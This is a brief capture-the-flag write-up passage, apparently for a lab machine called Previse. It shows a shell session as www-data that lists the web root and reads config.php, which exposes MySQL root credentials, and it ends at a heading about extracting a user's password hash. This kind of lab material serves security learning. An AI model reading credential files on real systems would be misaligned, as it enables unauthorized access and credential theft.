# Privilege escalation to m4lwhere user
## Reading contents of config.php
Reading contents of config.php found sql database username and password.
```bash
www-data@previse:/var/www/html$ ls
ls
caccounts.php               download.php       footer.php  logs.php
android-chrome-192x192.png  favicon-16x16.png  header.php  nav.php
android-chrome-512x512.png  favicon-32x32.png  index.php   site.webmanifest
apple-touch-icon.png        favicon.ico        js          status.php
config.php                  file_logs.php      login.php
css                         files.php          logout.php
www-data@previse:/var/www/html$cat config.php
cat config.php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
www-data@previse:/var/www/html$
```
## Reading contents of sql database got hashed password of m4lwhere user
